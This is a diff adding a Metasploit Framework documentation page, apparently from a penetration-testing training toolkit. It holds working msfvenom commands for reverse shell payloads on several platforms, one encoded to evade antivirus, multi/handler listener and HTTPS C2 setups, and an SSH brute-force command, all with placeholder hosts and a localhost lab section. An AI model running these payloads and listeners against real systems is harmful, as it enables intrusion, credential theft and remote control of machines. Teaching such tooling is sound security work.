@@ -1,0 +1,186 @@
+---
+title: "Metasploit Framework — Penetration Testing Platform"
+description: Metasploit Framework is the industry-standard penetration testing platform containing exploits, payloads, auxiliary scanners, and post-exploitation modules
+sidebar:
+  order: 10
+---
+
+## What It Does
+
+Metasploit Framework is the industry-standard penetration testing platform. It contains exploits, payloads, auxiliary scanners, and post-exploitation modules. `msfconsole` is the main interactive interface, `msfvenom` generates custom payloads, and `msfdb` manages the results database. The framework ties together the full attack lifecycle: scanning, exploitation, post-exploitation, and reporting.
+
+## Running the Examples Script
+
+```bash
+# No target argument required
+bash scripts/metasploit/examples.sh
+
+# Or via Makefile (no Makefile target for base examples)
+# Use the use-case scripts below instead
+```
+
+The script prints 10 example commands covering console usage, exploit selection, scanning, payload generation, and Meterpreter basics.
+
+## Key Commands to Remember
+
+| Command | What It Does |
+| ------ | ------------- |
+| `msfconsole` | Start the Metasploit console |
+| `msfvenom` | Generate payloads (standalone tool) |
+| `msfdb init` | Initialize the Metasploit database |
+| `use <module>` | Select a module (exploit, auxiliary, etc.) |
+| `set RHOSTS <target>` | Set the remote target |
+| `set LHOST <ip>` | Set your local IP for reverse connections |
+| `set PAYLOAD <payload>` | Select payload type |
+| `run` / `exploit` | Execute the selected module |
+| `exploit -j` | Run as background job |
+| `sessions -l` | List active sessions |
+| `search type:exploit name:<keyword>` | Search for modules by keyword |
+| `db_import <file>.xml` | Import nmap XML scan results |
+| `msfconsole -r <file>.rc` | Run a resource script for automation |
+
+## Standard Workflow
+
+1. **Scan** the target with nmap, import results into MSF with `db_import`
+2. **Enumerate** services with auxiliary scanners (see scan-network-services.sh)
+3. **Generate** a payload with msfvenom (see generate-reverse-shell.sh)
+4. **Start** a listener with multi/handler (see setup-listener.sh)
+5. **Deliver** the payload to the target
+6. **Catch** the connection -- get a Meterpreter session
+7. **Post-exploit** -- sysinfo, getuid, hashdump, pivot
+
+## Use-Case Scripts
+
+### generate-reverse-shell.sh -- Create payloads for any platform
+
+Generates reverse shell payloads for Linux, Windows, macOS, PHP, Python, JSP, and WAR using msfvenom. Auto-detects your local IP address. Reverse shells connect back to your listener, bypassing firewalls that block inbound connections.
+
+**When to use:** After identifying a vulnerability that allows code execution. Generate a payload matched to the target OS and delivery method.
+
+**Key commands:**
+
+```bash
+# Linux reverse shell (ELF binary)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
+
+# Windows Meterpreter (EXE)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
+
+# PHP reverse shell (for web app upload)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php
+
+# Python reverse shell
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.py
+
+# WAR file (deploy to Tomcat/JBoss)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war
+
+# macOS reverse shell
+msfvenom -p osx/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f macho -o shell.macho
+
+# Encoded payload to evade basic AV
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -e x64/xor_dynamic -f exe -o encoded.exe
+
+# List all available payloads for a platform
+msfvenom --list payloads | grep linux/x64
+```
+
+**Make target:** `make gen-payload`
+
+---
+
+### scan-network-services.sh -- Enumerate services using MSF auxiliary scanners
+
+Enumerates network services using Metasploit's auxiliary scanner modules. Goes beyond nmap with protocol-specific fingerprinting, built-in brute force, and version-specific vulnerability checks. Covers SMB, SSH, HTTP, MySQL, FTP, VNC, and more.
+
+**When to use:** After nmap identifies open ports. Use MSF scanners for deeper enumeration and to set up seamless transition to exploitation.
+
+**Key commands:**
+
+```bash
+# SMB version detection
+msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS <target>; run; exit"
+
+# SSH version detection
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS <target>; run; exit"
+
+# HTTP version detection (specify port with RPORT)
+msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS <target>; set RPORT 8080; run; exit"
+
+# MySQL enumeration
+msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS <target>; run; exit"
+
+# SMB share enumeration
+msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS <target>; run; exit"
+
+# SSH brute force with wordlist
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS <target>; set USERNAME root; set PASS_FILE /path/to/passwords.txt; run; exit"
+
+# HTTP directory scanner
+msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS <target>; set RPORT 8080; run; exit"
+
+# Subnet port scan
+msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <target>/24; set PORTS 22,80,443,8080; run; exit"
+```
+
+**Make target:** `make scan-services TARGET=<ip>`
+
+---
+
+### setup-listener.sh -- Configure multi/handler to catch reverse shells
+
+Configures and starts the Metasploit multi/handler listener that catches incoming reverse shell connections. The handler must be running with the SAME LHOST/LPORT used when generating the payload with msfvenom.
+
+**When to use:** Before delivering a payload to a target. Start the listener first, then execute the payload.
+
+**Key commands:**
+
+```bash
+# Linux Meterpreter handler
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"
+
+# Windows Meterpreter handler
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"
+
+# PHP Meterpreter handler
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"
+
+# Multi-handler as background job (stays running for multiple connections)
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; set ExitOnSession false; exploit -j"
+
+# HTTPS handler for encrypted C2
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <ip>; set LPORT 443; run"
+
+# Create a reusable resource script file
+echo -e "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST <ip>\nset LPORT 4444\nrun" > handler.rc
+msfconsole -r handler.rc
+```
+
+**Make target:** `make setup-listener`
+
+## Practice Against Lab Targets
+
+```bash
+make lab-up
+
+# Scan lab target HTTP services
+msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS localhost; set RPORT 8080; run; exit"
+
+# Directory scan against DVWA
+msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS localhost; set RPORT 8080; run; exit"
+
+# Scan VulnerableApp on port 8180
+msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS localhost; set RPORT 8180; run; exit"
+```
+
+## Notes
+
+- Metasploit is interactive -- most real work happens inside `msfconsole`, not from the command line
+- The `-q` flag starts msfconsole without the banner (quieter), `-x` runs commands non-interactively
+- Always match the payload in your handler to the payload used in msfvenom -- mismatches silently fail
+- `exploit -j` runs the handler as a background job so you can interact with other modules
+- `set ExitOnSession false` keeps the handler listening after catching a session (for multiple targets)
+- Resource scripts (`.rc` files) automate repetitive setups -- `msfconsole -r script.rc`
+- Import nmap results with `db_import scan.xml` to keep all findings in one place
+- Meterpreter is more powerful than a basic shell -- it supports file transfer, pivoting, screenshot, hashdump
+- Practice payload generation and handler setup together until the workflow is second nature
